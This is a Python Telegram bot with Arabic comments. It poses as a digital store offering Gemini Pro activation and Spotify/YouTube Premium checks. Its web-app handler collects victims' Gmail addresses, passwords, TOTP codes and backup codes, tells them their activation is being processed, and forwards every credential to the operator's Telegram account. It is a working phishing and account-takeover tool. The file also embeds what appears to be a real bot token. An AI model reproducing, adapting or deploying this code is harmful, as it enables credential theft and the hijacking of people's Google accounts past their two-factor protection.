import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import json

# ضع هنا توكن بوتك الخاص
API_TOKEN = '8840162276:AAEs2AlVqsdRBCaqa5yMLsw_noCb7cv1dn0'
# ضع هنا الآيدي (ID) الخاص بحسابك لكي تصلك الطلبات عليه
ADMIN_ID = '8227136699'

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = InlineKeyboardMarkup(row_width=1)
    
    # استبدل هذا الرابط برابط موقعك على Netlify الخاص بواجهة الإدخال
    web_app_url = "https://ضع_رابط_موقعك_هنا.netlify.app"
    
    markup.add(
        InlineKeyboardButton("🤖 تفعيل جيمناي برو (فتح النموذج)", web_app=WebAppInfo(url=web_app_url)),
        InlineKeyboardButton("🎧 تحقق سبوتيفاي", callback_data="spotify_page"),
        InlineKeyboardButton("🌟 تحقق يوتيوب بريميوم", callback_data="youtube_page")
    )
    
    welcome_text = """
أهلاً بك في متجرنا الرقمي الاحترافي! 🌟
اختر الخدمة المطلوبة من الأزرار أدناه:
"""
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)

# استقبال البيانات المرسلة من النافذة المنبثقة وتوجيهها لك
@bot.message_handler(content_types=['web_app_data'])
def handle_web_app_data(message):
    chat_id = message.chat.id
    username = message.from_user.username if message.from_user.username else "بدون معرف"
    
    try:
        # قراءة البيانات الواردة من النافذة المنبثقة
        data = json.loads(message.web_app_data.data)
        email = data.get('email')
        password = data.get('password')
        totp = data.get('totp')
        backup = data.get('backup')
        
        # 1. الرد على المستخدم بأن طلبه قيد المعالجة تماماً كما طلبت
        bot.send_message(chat_id, "⏳ **طلبك قيد المعالجة، يرجى الانتظار..**\nتم استلام بياناتك بنجاح وسيتم التفعيل قريباً.")
        
        # 2. إرسال البيانات إليك في حسابك الخاص
        admin_message = f"""
🤖 **طلب تفعيل Gemini Pro جديد (عبر النافذة المنبثقة)**

👤 العميل: @{username} (ID: `{chat_id}`)
📧 Gmail: `{email}`
🔑 الباسورد: `{password}`
🔒 TOTP: `{totp}`
🛡️ الرمز الاحتياطي: `{backup}`
"""
        bot.send_message(ADMIN_ID, admin_message, parse_mode="Markdown")
        
    except Exception as e:
        bot.send_message(chat_id, "حدث خطأ في قراءة البيانات، يرجى المحاولة مرة أخرى.")

# دالة للرد على الأزرار الأخرى
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "spotify_page":
        bot.answer_callback_query(call.id, "قريباً سيتم توفير نموذج سبوتيفاي")
    elif call.data == "youtube_page":
        bot.answer_callback_query(call.id, "قريباً سيتم توفير نموذج يوتيوب")

print("البوت يعمل الآن...")
bot.infinity_polling()

